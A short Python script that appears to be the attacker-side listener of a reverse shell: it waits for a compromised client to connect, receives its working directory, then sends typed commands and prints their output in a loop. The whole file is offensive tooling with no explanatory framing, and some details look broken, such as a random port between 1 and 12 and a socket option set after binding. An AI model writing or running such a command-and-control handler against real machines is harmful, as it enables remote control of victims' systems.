import socket
import random

SERVER_HOST = "0.0.0.0"
SERVER_PORT = random.randint(1, 12)
BUFFER_SIZE = 1024 * 12800
SEPARATOR = "<sep>"

s = socket.socket()

s.bind((SERVER_HOST, SERVER_PORT))
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

cwd = client_socket.recv(BUFFER_SIZE).decode()
print("Current directory:", cwd)

while True:
    command = input(f"{cwd}> ")
    if not command.strip():
        continue
    client_socket.send(command.encode())
    if command.lower() == "exit":
        break
    output = client_socket.recv(BUFFER_SIZE).decode()
    print("output:", output)
    results, cwd = output.split(SEPARATOR)
    print(results)
client_socket.close()
s.close()